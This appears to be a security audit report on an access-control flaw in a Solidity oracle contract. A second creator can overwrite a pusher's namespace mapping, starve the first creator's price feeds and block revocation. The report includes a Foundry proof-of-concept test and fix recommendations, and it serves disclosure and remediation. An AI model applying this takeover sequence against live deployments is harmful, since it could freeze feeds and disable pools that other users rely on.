### Title
`allowContractPushers` Does Not Guard Against Namespace Overwrite — Stale `namespaceRemapping` Silently Redirects Pusher, Starving Creator's Feeds of Updates - (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowContractPushers` checks `isPusher(creator)` exactly once at registration time and writes `namespaceRemapping[pusher] = msg.sender` with no guard against overwriting an existing mapping. Because the `fallback()` push path reads only the stored `namespaceRemapping` value and never re-verifies live consent, any caller who can satisfy `isPusher(newCreator) == true` can silently redirect a pusher's future writes away from the original creator's namespace. The original creator's feeds then receive no further updates, become stale, and every pool that reads those feeds via `AnchoredPriceProvider` halts with `FeedStalled`.

### Finding Description

`allowContractPushers` justifies omitting a deadline by claiming consent is "proven by a LIVE `isPusher(creator)` staticcall": [1](#0-0) 

The live check is performed only at registration time. After that, `namespaceRemapping[pusher]` is the sole authority consulted on every push: [2](#0-1) 

There is no `require(namespaceRemapping[pusher] == address(0))` guard before the overwrite: [3](#0-2) 

This is the direct analog of the LiquidityGauge bug: just as `working_balance` is computed once from `VotingEscrow.balanceOf` and never refreshed when the underlying balance changes, `namespaceRemapping` is set once from a live `isPusher` call and never refreshed when the pusher contract's consent state changes or when a second creator claims the same pusher.

`removePushers` enforces `namespaceRemapping[pusher] == msg.sender` before clearing: [4](#0-3) 

Once Creator B overwrites the mapping, Creator A's call to `removePushers` reverts with `InvalidManager`, so Creator A **cannot reclaim or revoke the pusher** through the normal path.

### Impact Explanation

After the redirect:

1. The pusher's `fallback()` calls write into Creator B's namespace (`feedIdOf(CreatorB, slot, pos)`), not Creator A's.
2. Creator A's slots receive no further timestamp-advancing updates.
3. `AnchoredPriceProvider._readLeg` checks staleness: [5](#0-4) 

4. Once `MAX_REF_STALENESS` elapses, every `getBidAndAskPrice()` call on pools backed by Creator A's feeds returns `(0, type(uint128).max)` or reverts `FeedStalled`, making swaps on those pools permanently unusable until Creator A manually resumes pushing.

### Likelihood Explanation

The attack requires a pusher contract whose `isPusher` returns `true` for more than one creator — either a shared/public relay contract (realistic for infrastructure providers serving multiple pools), an upgradeable proxy whose implementation is changed, or any contract with mutable allowlist state. The test suite itself ships `MockPusherAllowed` (returns `true` for any caller) as a first-class test fixture, confirming the protocol anticipates such contracts: [6](#0-5) 

No privileged role is needed; any address can call `allowContractPushers`.

### Recommendation

1. **Guard against overwriting an existing mapping**: before writing `namespaceRemapping[pusher] = msg.sender`, require that the slot is empty or already owned by `msg.sender`:
   ```solidity
   address existing = namespaceRemapping[pusher];
   require(existing == address(0) || existing == msg.sender, AlreadyMapped());
   ```
2. **Re-verify consent at push time** (or document clearly that `isPusher` is a one-time snapshot, not a live gate), so the "live check" justification matches the actual security model.
3. Alternatively, add a `deadline` parameter to `allowContractPushers` consistent with `allowPushers`, forcing periodic re-authorization and bounding the window during which a stale mapping can be exploited.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "contracts/oracles/utils/U64x32.sol";

// Shared relay: returns true for any caller (realistic public push relay)
contract SharedRelay {
    function isPusher(address) external pure returns (bool) { return true; }
}

contract NamespaceOverwritePoC is Test {
    CompressedOracleV1 oracle;
    SharedRelay relay;
    address creatorA = address(0xAAAA);
    address creatorB = address(0xBBBB);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        relay  = new SharedRelay();
        vm.warp(1_700_000_000);
    }

    function test_overwrite_redirects_pusher() public {
        // 1. Creator A registers the shared relay as their pusher.
        vm.prank(creatorA);
        oracle.allowContractPushers(_arr(address(relay)));
        assertEq(oracle.namespaceRemapping(address(relay)), creatorA);

        // 2. Creator B overwrites the mapping — no signature, no consent from Creator A.
        vm.prank(creatorB);
        oracle.allowContractPushers(_arr(address(relay)));
        assertEq(oracle.namespaceRemapping(address(relay)), creatorB, "mapping hijacked");

        // 3. Creator A can no longer revoke — removePushers reverts InvalidManager.
        vm.prank(creatorA);
        vm.expectRevert();
        oracle.removePushers(_arr(address(relay)));

        // 4. Relay's next push lands in Creator B's namespace, not Creator A's.
        uint56 ts = uint56(block.timestamp * 1000);
        uint256 word = (uint256(ts) << 8) | uint256(0); // slotId=0
        word |= uint256(uint48(uint32(1_000_000)) << 16) << 208; // price in lane 0
        vm.prank(address(relay));
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Creator A's feed: price = 0 (never updated → stale → FeedStalled in AnchoredPriceProvider)
        IOffchainOracle.OracleData memory dataA =
            oracle.getOracleData(oracle.feedIdOf(creatorA, 0, 0));
        assertEq(dataA.price, 0, "Creator A feed starved");

        // Creator B's feed: received the push
        IOffchainOracle.OracleData memory dataB =
            oracle.getOracleData(oracle.feedIdOf(creatorB, 0, 0));
        assertGt(dataB.price, 0, "Creator B feed received push");
    }

    function _arr(address a) internal pure returns (address[] memory r) {
        r = new address[](1); r[0] = a;
    }
}
```

    /// @notice Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)`
    ///         staticcall instead of a signature, so there is nothing to replay and no
    ///         deadline is needed.
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }

    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
